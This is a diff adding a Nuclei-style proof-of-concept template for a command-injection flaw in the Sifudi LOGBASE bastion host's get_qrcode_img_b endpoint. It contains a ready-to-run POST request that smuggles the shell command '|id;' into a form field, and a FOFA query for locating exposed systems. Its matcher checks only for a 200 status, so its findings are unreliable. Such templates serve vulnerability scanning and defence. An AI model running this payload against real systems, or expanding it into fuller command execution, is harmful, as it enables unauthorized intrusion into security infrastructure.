@@ -1,0 +1,36 @@
+id: poc-yiee0mzc0h99qnsc
+info:
+  name: 思迪福堡垒机系统 get_qrcode_img_b 存在命令注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yiee0mzc0h99qnsc'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yiee0mzc0h99qnsc
+    fofa: app="思福迪-LOGBASE"
+http:
+- raw:
+  - 'POST /bhost/get_qrcode_img_b HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Moziilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
+
+    Content-Length: 9
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Referer:
+
+
+    z1="|id;"'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
